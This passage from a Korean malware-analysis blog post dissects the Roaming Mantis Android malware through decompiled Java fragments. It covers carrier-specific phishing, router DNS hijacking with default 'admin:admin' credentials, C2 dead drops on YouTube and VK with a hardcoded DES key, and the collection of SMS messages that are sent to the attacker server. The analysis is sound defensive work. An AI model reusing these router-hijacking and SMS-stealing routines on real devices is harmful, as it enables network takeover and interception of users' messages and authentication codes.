<span class="n">v2_1</span> <span class="o">=</span> <span class="n">v2_1</span> <span class="o">+</span> <span class="s">"/"</span> <span class="o">+</span> <span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="n">v7</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"ss1"</span><span class="p">));</span>

<span class="c1">// 수집한 정보를 JSON-RPC로 전달, 웹 서버 종료</span>
<span class="n">String</span> <span class="n">v0_1</span> <span class="o">=</span> <span class="s">"JSON:"</span> <span class="o">+</span> <span class="n">new</span> <span class="nf">JSONObject</span><span class="p">(</span><span class="n">v7</span><span class="p">).</span><span class="n">toString</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="n">this</span><span class="p">.</span><span class="n">c</span><span class="p">.</span><span class="n">g</span><span class="p">.</span><span class="n">f</span><span class="p">(</span><span class="s">"setMyInfo"</span><span class="p">,</span> <span class="n">new</span> <span class="n">String</span><span class="p">[]{</span><span class="n">v8_1</span><span class="p">,</span> <span class="n">v0_1</span><span class="p">}).</span><span class="n">f</span><span class="p">(</span><span class="n">new</span> <span class="n">Loader</span><span class="p">.</span><span class="n">t0</span><span class="p">.</span><span class="n">a</span><span class="p">(</span><span class="n">this</span><span class="p">,</span> <span class="n">v7</span><span class="p">),</span> <span class="n">Loader</span><span class="p">.</span><span class="n">t0</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="n">a</span><span class="p">);</span>
<span class="err">}</span>
</code></pre></div></div>

<hr />

<p>④ <strong>Phishing 창 생성 #2</strong></p>

<p>또 다른 Phishing 창의 예시를 살펴봅시다. 이 Phishing은 앱 이름이 <code class="language-plaintext highlighter-rouge">zc1</code>. <code class="language-plaintext highlighter-rouge">zc</code>. <code class="language-plaintext highlighter-rouge">scan</code> 일 경우 수행됩니다.</p>
<p>사용자가 어떤 통신사를 사용하는 지에 따라, 그에 맞는 Phishing 페이지를 생성합니다. 아래는 일본의 통신사인 <code class="language-plaintext highlighter-rouge">domoco</code>를 사용 할 경우의 예시입니다.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">else</span> <span class="k">if</span><span class="o">(</span><span class="n">l</span><span class="o">.</span><span class="na">j</span><span class="o">(</span><span class="n">v0_3</span><span class="o">,</span> <span class="s">"docomo"</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="mi">2</span><span class="o">,</span> <span class="kc">null</span><span class="o">))</span> <span class="o">{</span> <span class="c1">// 1. domoco 통신사일 경우</span>
                    <span class="n">b</span> <span class="n">v0_6</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">h</span><span class="o">(</span><span class="s">"https://www.pinterest.com/catogreggex11/"</span><span class="o">);</span>
                    <span class="n">v7</span> <span class="o">=</span> <span class="o">(</span><span class="nc">String</span><span class="o">)</span><span class="n">v0_6</span><span class="o">.</span><span class="na">a</span><span class="o">();</span>
                    <span class="n">v0_5</span> <span class="o">=</span> <span class="o">(</span><span class="nc">String</span><span class="o">)</span><span class="n">v0_6</span><span class="o">.</span><span class="na">b</span><span class="o">();</span> <span class="c1">// 2. 위의 URL에서 info 정보 수집</span>
                    <span class="n">v1</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="n">v0_5</span><span class="o">,</span> <span class="s">""</span><span class="o">)</span> <span class="o">?</span> <span class="s">"【JNB】お客様がご利用のジャパンネット銀行に対し、第三者からの不正なアクセスを検知しました。ご確認ください。"</span> <span class="o">:</span>  <span class="c1">// 3. 수집이 안 될 경우를 대비한 피싱 문구</span>
                <span class="o">}</span>
</code></pre></div></div>

<p>v0_6를 보면, <code class="language-plaintext highlighter-rouge">https://www.pinterest.com/catogreggex11/</code>의 주소로 접근하려는 것을 볼 수 있습니다. Pinterest는 유명한 이미지 공유 사이트로, 피싱 사이트가 아닙니다. 해당 URL은 경로에 적힌 <code class="language-plaintext highlighter-rouge">catogreggex11</code> 계정의 프로필 페이지에 접근 하는 것으로, 한번 직접 접근해보도록 합시다.</p>

<p><img src="/assets/2023-11-15-Android-malware-사마귀-해부학/11.png" alt="11.png" /></p>

<p>info 문구를 보면 통신사에 맞는 Phshing 문구가 입력되어 있는 것을 확인할 수 있습니다. 위의 코드에서 v0_5는 이 info 문구를 parsing 하고,  <code class="language-plaintext highlighter-rouge">----</code> 를 기점으로 각각 Notification의 문구와  Notification 클릭 시 open되는 WebView URL로 사용합니다.</p>

<hr />

<p><strong>⑤ 공유기 장악 (DNS Hijacking)</strong></p>

<p>Roaming Mantis의 가장 핵심이 되는 공유기 장악 기능을 분석해봅시다.</p>

<p>모바일 환경에서는 대부분의 기기가 공유기(라우터)를 DHCP 서버로 두고 IP 및 DNS 주소를 할당 받는 방식을 사용하고 있습니다. 따라서 공격자는 DHCP Server의 IP 주소를 수집합니다.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">v2</span> <span class="o">=</span> <span class="o">((</span><span class="nc">WifiManager</span><span class="o">)</span><span class="k">this</span><span class="o">.</span><span class="na">n</span><span class="o">.</span><span class="na">getApplicationContext</span><span class="o">().</span><span class="na">getSystemService</span><span class="o">(</span><span class="s">"wifi"</span><span class="o">)).</span><span class="na">getDhcpInfo</span><span class="o">().</span><span class="na">serverAddress</span><span class="o">;</span>
</code></pre></div></div>

<p>하지만 DHCP 서버의 IP 주소를 알아봤자, 사설 IP의 주소일 가능성이 매우 크기 때문에 공격자는 직접 접근하기 어려울 것입니다. 내부에서 접근을 시도해야 하므로 공격자는 사용자의 기기로 접근합니다.</p>

<p>공격자는 수집한 DHCP 서버의 IP 주소에 특정 TCP Port를 추가하여 로그인 페이지를 호출합니다.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span><span class="o">[]</span> <span class="n">v5</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">int</span><span class="o">[]{</span><span class="mi">8080</span><span class="o">,</span> <span class="mi">8888</span><span class="o">,</span> <span class="mi">80</span><span class="o">,</span> <span class="mi">7777</span><span class="o">,</span> <span class="mi">8899</span><span class="o">};</span>
<span class="k">for</span><span class="o">(</span><span class="n">v9</span> <span class="o">=</span> <span class="s">"http://"</span> <span class="o">+</span> <span class="n">v2_1</span> <span class="o">+</span> <span class="s">":"</span> <span class="o">+</span> <span class="n">v8</span> <span class="o">+</span> <span class="s">"/login/login.cgi"</span><span class="o">;</span> <span class="kc">true</span><span class="o">;</span> <span class="n">v9</span> <span class="o">=</span> <span class="n">v10_1</span><span class="o">.</span><span class="na">toString</span><span class="o">()){</span>
                    <span class="n">v9_1</span> <span class="o">=</span> <span class="n">a</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="n">v9</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
</code></pre></div></div>

<p>코드를 보면, <code class="language-plaintext highlighter-rouge">8080</code>, <code class="language-plaintext highlighter-rouge">8888</code>, <code class="language-plaintext highlighter-rouge">80</code> 등 주로 웹 서비스에서 사용하는 포트들을 대상으로 하는 것을 볼 수 있습니다. 그렇게 획득한 주소에 <code class="language-plaintext highlighter-rouge">/login/login.cgi</code> 경로를 붙여 최종적으로 <code class="language-plaintext highlighter-rouge">http://{DHCP_SERVER}:{PORT}/login/login.cgi</code> 라는 URL을 완성합니다.</p>

<p>아래는 실행 시 실제로 보내진 HTTP Request Dump입니다.</p>

<p><img src="/assets/2023-11-15-Android-malware-사마귀-해부학/12.png" alt="12.png" /></p>

<p>URL의 경로에서 유추할 수 있듯, 공격자는 <strong>공유기 관리 페이지에 접근</strong>하여 실제 응답이 돌아오는 지 확인합니다. 그리고 만약 응답이 돌아온다면 저장하고, Refresh 혹은 Redirect 되는 Response가 온다면 해당 경로까지 접근하여 최종적인 Response를 받아옵니다.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Matcher</span> <span class="n">v10</span> <span class="o">=</span> <span class="nc">Pattern</span><span class="o">.</span><span class="na">compile</span><span class="o">(</span><span class="s">"http-equiv=\"?refresh\"? .+?URL=(.+?)\""</span><span class="o">,</span> <span class="mi">2</span><span class="o">).</span><span class="na">matcher</span><span class="o">(</span><span class="n">v9_1</span><span class="o">);</span>
 <span class="nc">Matcher</span> <span class="n">v10_2</span> <span class="o">=</span> <span class="nc">Pattern</span><span class="o">.</span><span class="na">compile</span><span class="o">(</span><span class="s">"&lt;script&gt;.+\\.location=\"(.+?)\";.*//session_timeout"</span><span class="o">,</span> <span class="mi">2</span><span class="o">).</span><span class="na">matcher</span><span class="o">(</span><span class="n">v9_1</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">" "</span><span class="o">,</span> <span class="s">""</span><span class="o">));</span>
</code></pre></div></div>

<p>Response가 있다면 HTTP source code 에는 해당 DHCP 서버(공유기)의 정보가 있을 것입니다.</p>

<p>아래는 공유기 모델에 따라 HTTP 페이지에 적혀 있는 값입니다. 만약 일치하는 패턴이 있다면 <strong>공유기의 모델이 어떤 것인지 유추할 수 있습니다.</strong> 공격자는 이 패턴과 숫자를 매칭하여 저장합니다.</p>

<p><img src="/assets/2023-11-15-Android-malware-사마귀-해부학/13.png" alt="13.png" /></p>

<p>어떤 번호에 매칭되었느냐에 따라 다양한 method들이 호출되는데, 여기서 1번 i사의 공유기에 매칭 되었다고 가정해봅시다.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="o">(</span><span class="n">v2</span> <span class="o">==</span> <span class="mi">1</span><span class="o">)</span> <span class="o">{</span>
       <span class="k">this</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">e</span><span class="o">(</span><span class="n">v1</span><span class="o">.</span><span class="na">a</span><span class="o">);</span>
       <span class="k">return</span><span class="o">;</span>
       <span class="o">}</span>

<span class="k">if</span><span class="o">(</span><span class="n">v2</span> <span class="o">==</span> <span class="mi">2</span><span class="o">)</span> <span class="o">{</span>
      <span class="k">this</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">k</span><span class="o">(</span><span class="n">v1</span><span class="o">.</span><span class="na">a</span><span class="o">);</span>
      <span class="k">return</span><span class="o">;</span>
      <span class="o">}</span>
<span class="o">...</span>
</code></pre></div></div>

<p>매칭된 숫자에 따라 실행되는 method들이 달라집니다. 1번에 매칭되었으니 <code class="language-plaintext highlighter-rouge">a.e</code> method로 이동해봅시다.</p>

<p>매칭된 i사의 공유기의 Default Credential과 token 검증 방식으로 인증을 수행하기 위해 Request Header 생성, 이를 Default URL로 전달하고 있습니다. 각 공유기마다 Header의 조합과 URL 주소가 다르며, 일반적인 공유기 사용자가 관리 페이지의 Credential을 바꾸는 일은 흔치 않기 때문에 공격자는 쉽게 관리자로 로그인 할 수 있습니다.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">e</span><span class="o">(</span><span class="nc">String</span> <span class="n">arg14</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">String</span><span class="o">[]</span> <span class="n">v1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">String</span><span class="o">[</span><span class="mi">2</span><span class="o">];</span>
        <span class="kt">int</span> <span class="n">v2</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
        <span class="n">v1</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">=</span> <span class="s">"Authorization"</span><span class="o">;</span>
        <span class="n">v1</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">=</span> <span class="s">"Basic "</span> <span class="o">+</span> <span class="nc">Base64</span><span class="o">.</span><span class="na">encodeToString</span><span class="o">(</span><span class="s">"admin:admin"</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(),</span> <span class="mi">0</span><span class="o">);</span>
        <span class="n">a</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">e</span><span class="o">(</span><span class="n">arg14</span> <span class="o">+</span> <span class="s">"/cgi-bin/timepro.cgi?tmenu=main_frame&amp;smenu=main_frame"</span><span class="o">,</span> <span class="n">v1</span><span class="o">);</span>
        <span class="nc">String</span> <span class="n">v4</span> <span class="o">=</span> <span class="n">a</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">e</span><span class="o">(</span><span class="n">arg14</span> <span class="o">+</span> <span class="s">"/cgi-bin/timepro.cgi?tmenu=netconf&amp;smenu=wansetup"</span><span class="o">,</span> <span class="n">v1</span><span class="o">);</span>
        <span class="nc">ArrayList</span> <span class="n">v7</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">();</span>
        <span class="kt">int</span> <span class="n">v8</span><span class="o">;</span>
        <span class="k">for</span><span class="o">(</span><span class="n">v8</span> <span class="o">=</span> <span class="mi">1</span><span class="o">;</span> <span class="n">v8</span> <span class="o">&lt;=</span> <span class="mi">4</span><span class="o">;</span> <span class="o">++</span><span class="n">v8</span><span class="o">)</span> <span class="o">{</span>
            <span class="nc">Matcher</span> <span class="n">v9</span> <span class="o">=</span> <span class="nc">Pattern</span><span class="o">.</span><span class="na">compile</span><span class="o">(</span><span class="s">"id=\"disabled_dynamicip"</span> <span class="o">+</span> <span class="n">v8</span> <span class="o">+</span> <span class="s">".*?value=\"(.*?)\""</span><span class="o">).</span><span class="na">matcher</span><span class="o">(</span><span class="n">v4</span><span class="o">);</span>
            <span class="k">if</span><span class="o">(</span><span class="n">v9</span><span class="o">.</span><span class="na">find</span><span class="o">())</span> <span class="o">{</span>
                <span class="n">v7</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">v9</span><span class="o">.</span><span class="na">group</span><span class="o">(</span><span class="mi">1</span><span class="o">));</span>
            <span class="o">}</span>
        <span class="o">}</span>

</code></pre></div></div>

<p>그리고 마지막 부분에 <strong>DNS 서버를 변경하려는 Request를 생성하는데</strong>, 해당 DNS 서버의 주소는 C2 서버에 값이 저장되어 있습니다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// DNS 서버를 변경하는 Request 생성</span>
<span class="c1">// v3의 값은 C2 서버에서 파싱</span>
<span class="n">a</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="n">f</span><span class="p">(</span><span class="n">arg14</span> <span class="o">+</span> <span class="s">"/cgi-bin/timepro.cgi"</span><span class="p">,</span> <span class="n">v1</span><span class="p">,</span> <span class="s">"tmenu=iframe&amp;smenu=hiddenwansetup&amp;act=save&amp;ocolor=&amp;wan=wan1&amp;ifname=eth1&amp;nopassword=0&amp;wan_type=dynamic&amp;allow_private=on&amp;fdns_dynamic1="</span> <span class="o">+</span> <span class="n">v3</span><span class="p">.</span><span class="n">c</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">"&amp;fdns_dynamic2="</span> <span class="o">+</span> <span class="n">v3</span><span class="p">.</span><span class="n">c</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s">"&amp;fdns_dynamic3="</span> <span class="o">+</span> <span class="n">v3</span><span class="p">.</span><span class="n">c</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s">"&amp;fdns_dynamic4="</span> <span class="o">+</span> <span class="n">v3</span><span class="p">.</span><span class="n">c</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="s">"&amp;sdns_dynamic1="</span> <span class="o">+</span> <span class="n">v3</span><span class="p">.</span><span class="n">d</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">"&amp;sdns_dynamic2="</span> <span class="o">+</span> <span class="n">v3</span><span class="p">.</span><span class="n">d</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s">"&amp;sdns_dynamic3="</span> <span class="o">+</span> <span class="n">v3</span><span class="p">.</span><span class="n">d</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s">"&amp;sdns_dynamic4="</span> <span class="o">+</span> <span class="n">v3</span><span class="p">.</span><span class="n">d</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="s">"&amp;dns_dynamic_chk=on"</span><span class="p">.</span><span class="n">getBytes</span><span class="p">());</span>
</code></pre></div></div>

<p>이렇게 외부 서비스에 저장한 정보를 파싱해 올 수 있습니다. 사진에서는 활동 란에 적힌 부분이 바꾸고자 하는 동적 DNS 서버의 주소입니다.</p>

<p><img src="/assets/2023-11-15-Android-malware-사마귀-해부학/1.png" alt="1.png" /></p>

<hr />

<p>⑥ <strong>C2 서버 - 공격자 서버 정보 파싱</strong></p>

<p>바로 이전 섹션에서 타 서비스의 웹 사이트(C2 서버)에서 문구들을 수집하는 것을 보았습니다. 마찬가지로 공격자의 서버 정보도 C2 서버에 있습니다. 그렇다면 공격자 서버 정보를 찾아봅시다.</p>

<p>아래의 문자열은 외부 서비스와 많은 연관이 있는 것으로 추정되는 문자열입니다.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">this</span><span class="o">.</span><span class="na">n</span> <span class="o">=</span> <span class="s">"chrome|UCP5sKzxDLR5yhO1IB4EqeEg@youtube|id728589530@vk|1s0n64k12_r9MglT5m9lr63M5F3e-xRyaMeYP7rdOTrA@GoogleDoc2"</span><span class="o">;</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">현재 피싱 앱으로 사용하는 이름|youtube계정|vk계정|GoogleDoc계정</code> 의 정보를 담고 있으며, 이 앱은 <code class="language-plaintext highlighter-rouge">covid</code>등 다양한 이름으로 배포되고 있었습니다. 따라서 현재 사용하는 앱 이름에 맞는 정보를 파싱하도록 동작하고 있습니다.</p>

<p>우선 vk(<code class="language-plaintext highlighter-rouge">id728589530@vk</code>) 계정이 어디서 사용되는지 확인해봅시다. 앱 이름이 <code class="language-plaintext highlighter-rouge">debug</code>가 아닐 경우에 수행되며, 최종적으로 <code class="language-plaintext highlighter-rouge">id729071494</code> 계정의 info페이지에 접근하게 됩니다.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 1. info 페이지 접근</span>
<span class="nc">String</span> <span class="n">v3</span> <span class="o">=</span> <span class="nc">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">"https://m.vk.com/%s?act=info"</span><span class="o">,</span> <span class="nc">Arrays</span><span class="o">.</span><span class="na">copyOf</span><span class="o">(</span><span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="n">arg3</span><span class="o">},</span> <span class="mi">1</span><span class="o">));</span>

<span class="c1">// 2. noopener 태그 사이의 문자열 매칭</span>
 <span class="nc">Matcher</span> <span class="n">v3_3</span> <span class="o">=</span> <span class="nc">Pattern</span><span class="o">.</span><span class="na">compile</span><span class="o">(</span><span class="s">"noopener\"&gt;(.+?)&lt;/a&gt;"</span><span class="o">).</span><span class="na">matcher</span><span class="o">(</span><span class="n">v3_2</span><span class="o">);</span>
</code></pre></div></div>

<p>페이지의 HTTP Code 중 <code class="language-plaintext highlighter-rouge">noopener</code> 태그 이후의 문자열을 확인하면 아래와 같이 공격자 서버를 확인할 수 있습니다.</p>

<p><img src="/assets/2023-11-15-Android-malware-사마귀-해부학/14.png" alt="14.png" /></p>

<p>이 서버는 결론적으로 DHCP서버의 Captcha 인증 중 Captcha 이미지를 보내는 서버입니다. 자세한 분석은 분량 상 생략하겠습니다.</p>

<p>다른 정보들은 어디에 쓰이는지 확인해봅시다.</p>

<p>아래는 기기의 환경이 한국일 경우 실행되는 코드로, 위의 계정 정보들 중 youtube(<code class="language-plaintext highlighter-rouge">UCP5sKzxDLR5yhO1IB4EqeEg@youtube</code>)계정 문자열을 파싱합니다.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// UCP5sKzxDLR5yhO1IB4EqeEg@youtube 문자열 파싱</span>
<span class="nc">String</span> <span class="n">v7</span> <span class="o">=</span> <span class="nc">Loader</span><span class="o">.</span><span class="na">access</span><span class="n">$getPreferences$p</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">b</span><span class="o">).</span><span class="na">getString</span><span class="o">(</span><span class="s">"account"</span><span class="o">,</span> <span class="o">((</span><span class="nc">String</span><span class="o">)</span><span class="n">v2</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">v8</span><span class="o">)));</span>
</code></pre></div></div>

<p>마찬가지로 해당 계정의 about 페이지에 접근한 후, <code class="language-plaintext highlighter-rouge">oeewe</code> 사이의 문자열을 파싱합니다.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 1. about 페이지 접근</span>
<span class="nc">String</span> <span class="n">v3</span> <span class="o">=</span> <span class="nc">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">"https://m.youtube.com/channel/%s/about"</span><span class="o">,</span> <span class="nc">Arrays</span><span class="o">.</span><span class="na">copyOf</span><span class="o">(</span><span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="n">arg3</span><span class="o">},</span> <span class="mi">1</span><span class="o">));</span>

<span class="c1">// 2. oeewe 사이의 문자열 매칭</span>
<span class="nc">Matcher</span> <span class="n">v3_3</span> <span class="o">=</span> <span class="nc">Pattern</span><span class="o">.</span><span class="na">compile</span><span class="o">(</span><span class="s">"oeewe([\\w_-]+?)oeewe"</span><span class="o">).</span><span class="na">matcher</span><span class="o">(</span><span class="n">v3_2</span><span class="o">);</span>
</code></pre></div></div>

<p>접근하면 아래와 같이 <code class="language-plaintext highlighter-rouge">oeewe … oeewe</code> 문자열을 설명란에서 볼 수 있습니다.</p>

<p><img src="/assets/2023-11-15-Android-malware-사마귀-해부학/15.png" alt="15.png" /></p>

<p>해당 문자열은 DES(CBC) 복호화 과정을 거칩니다. 다행히 Key와 IV가 하드코딩 되어있어, 쉽게  복호화 할 수 있습니다.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 1. Base64 Decoding</span>
<span class="kt">byte</span><span class="o">[]</span> <span class="n">v2</span> <span class="o">=</span> <span class="nc">Base64</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="n">arg2</span><span class="o">,</span> <span class="mi">8</span><span class="o">);</span>

<span class="c1">// 2. Key, IV 하드코딩(같은 값)</span>
<span class="k">return</span> <span class="k">new</span> <span class="nf">String</span><span class="o">(</span><span class="n">r</span><span class="o">.</span><span class="na">b</span><span class="o">(</span><span class="n">v2</span><span class="o">,</span> <span class="s">"Ab5d1Q32"</span><span class="o">),</span> <span class="n">d</span><span class="o">.</span><span class="na">a</span><span class="o">);</span>
</code></pre></div></div>

<p>복호화를 진행하면 아래와 같이 공격자의 서버 주소를 확인할 수 있습니다. 이 주소는 파싱 후 <code class="language-plaintext highlighter-rouge">ws://</code> 가 앞에 붙게 되므로 웹 소켓 주소로 사용되는 것을 추측할 수 있습니다.</p>

<p><img src="/assets/2023-11-15-Android-malware-사마귀-해부학/16.png" alt="16.png" /></p>

<hr />

<p>⑦ <strong>SMS관련</strong></p>

<p>아래는 기기가 기본 SMS 앱을 사용하는지 체크하는 부분입니다. 만약 기본 SMS앱을 악성 앱으로 바꾼다면, SMS 인증 우회는 물론이고, 메시지 내용 탈취, 발신, 수신이 자유로울 것입니다.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">v9_1</span><span class="o">[</span><span class="mi">5</span><span class="o">]</span> <span class="o">=</span> <span class="nc">Boolean</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">i</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="n">v5_6</span><span class="o">,</span> <span class="nc">Telephony</span><span class="o">.</span><span class="na">Sms</span><span class="o">.</span><span class="na">getDefaultSmsPackage</span><span class="o">(</span><span class="n">v7_4</span><span class="o">)));</span>
</code></pre></div></div>

<p><img src="/assets/2023-11-15-Android-malware-사마귀-해부학/17.png" alt="17.png" /></p>

<p>공격자는 SMS 메시지가 수신될 때, 발신자의 주소와 timestamp, 그리고 메시지내용을 HashMap으로 저장하며 수집합니다.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 1. 수신된 메시지들 수집</span>
<span class="n">v0_6</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Object</span><span class="o">[])</span><span class="n">arg27</span><span class="o">.</span><span class="na">getExtras</span><span class="o">().</span><span class="na">get</span><span class="o">(</span><span class="s">"pdus"</span><span class="o">);</span>
<span class="n">v12</span> <span class="o">=</span> <span class="n">v0_6</span><span class="o">[</span><span class="n">v10</span><span class="o">];</span>

<span class="c1">// 2. 수신된 메시지를 기반으로 새로운 SMS 데이터 생성</span>
<span class="nc">SmsMessage</span> <span class="n">v12_1</span> <span class="o">=</span> <span class="nc">SmsMessage</span><span class="o">.</span><span class="na">createFromPdu</span><span class="o">(((</span><span class="kt">byte</span><span class="o">[])</span><span class="n">v12</span><span class="o">));</span>

<span class="c1">// 3. 수신된 메시지의 내용 수집</span>
<span class="nc">String</span> <span class="n">v13</span> <span class="o">=</span> <span class="n">v12_1</span><span class="o">.</span><span class="na">getDisplayMessageBody</span><span class="o">();</span>

<span class="c1">// 4. 수신된 메시지의 발신 주소 수집</span>
<span class="nc">String</span> <span class="n">v14</span> <span class="o">=</span> <span class="n">v12_1</span><span class="o">.</span><span class="na">getDisplayOriginatingAddress</span><span class="o">();</span>

<span class="c1">// 5. 발신자 주소(key)-메시지의 timestamp(value) 로 저장</span>
<span class="n">v3_1</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">v14</span><span class="o">,</span> <span class="nc">Long</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">v12_1</span><span class="o">.</span><span class="na">getTimestampMillis</span><span class="o">()));</span>

<span class="c1">// 6. 발신자 주소(key)-메시지 내용(value)로 저장</span>
 <span class="n">v4_2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">v14</span><span class="o">,</span> <span class="n">v12_2</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
</code></pre></div></div>

<p>JSON-RPC로 <code class="language-plaintext highlighter-rouge">onSms</code> method와 수집한 내용을 공격자 서버로 전달합니다.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// s = "onSms"</span>
<span class="c1">// 1. Json-RPC로 onSms method 실행</span>
<span class="nb">Map</span> <span class="nx">map0</span> <span class="o">=</span> <span class="nx">b0</span><span class="p">.</span><span class="nx">f</span><span class="p">(</span><span class="k">new</span> <span class="nx">b</span><span class="p">[]{</span><span class="nx">c</span><span class="p">.</span><span class="nx">a</span><span class="p">(</span><span class="dl">"</span><span class="s2">jsonrpc</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">2.0</span><span class="dl">"</span><span class="p">),</span> <span class="nx">c</span><span class="p">.</span><span class="nx">a</span><span class="p">(</span><span class="dl">"</span><span class="s2">method</span><span class="dl">"</span><span class="p">,</span> <span class="nx">s</span><span class="p">)});</span>

<span class="c1">// 2. 수집한 내용을 params로 전달</span>
<span class="nx">map0</span><span class="p">.</span><span class="nx">put</span><span class="p">(</span><span class="dl">"</span><span class="s2">params</span><span class="dl">"</span><span class="p">,</span> <span class="nx">object0</span><span class="p">);</span>
</code></pre></div></div>

<p>이후 공격자는 audio 상태를 무음으로 변경합니다. 만약 기기를 자주 살펴보지 않는 사용자라면, 본인도 모르는 사이에 문자가 발신/수신 될 수 있습니다.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Object</span> <span class="n">v0_13</span> <span class="o">=</span> <span class="n">v2</span><span class="o">.</span><span class="na">getSystemService</span><span class="o">(</span><span class="s">"audio"</span><span class="o">);</span>
<span class="k">if</span><span class="o">(</span><span class="n">v0_13</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
  <span class="o">((</span><span class="nc">AudioManager</span><span class="o">)</span><span class="n">v0_13</span><span class="o">).</span><span class="na">setRingerMode</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
</code></pre></div></div>

<p>수신하는 경우의 로직도 존재합니다. 특이한 점은 수신한 문자의 앞 두글자에 따라 다른 동작을 한다는 것입니다. 마치 기계에 커맨드를 입력하는 것 같습니다.</p>

<p>맨 앞 두 글자에 따라 SharedPreference 객체에 key-value로 값을 저장하는 형태를 많이 보입니다.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 1. 앞 글자가 FS인 경우, fs(key)-메시지내용(value) 추가</span>
<span class="k">if</span><span class="o">(</span><span class="kt">boolean</span> <span class="n">z2</span> <span class="o">=</span> <span class="n">u</span><span class="o">.</span><span class="na">g</span><span class="o">(</span><span class="n">s12</span><span class="o">,</span> <span class="s">"FS"</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="mi">2</span><span class="o">,</span> <span class="kc">null</span><span class="o">))</span> <span class="o">{</span>
<span class="nc">Loader</span><span class="o">.</span><span class="na">access</span><span class="n">$getPreferences$p</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">a</span><span class="o">).</span><span class="na">edit</span><span class="o">().</span><span class="na">putString</span><span class="o">(</span><span class="s">"fs"</span><span class="o">,</span> <span class="n">r</span><span class="o">.</span><span class="na">c</span><span class="o">(</span><span class="n">s13</span><span class="o">))).</span><span class="na">apply</span><span class="o">()</span>

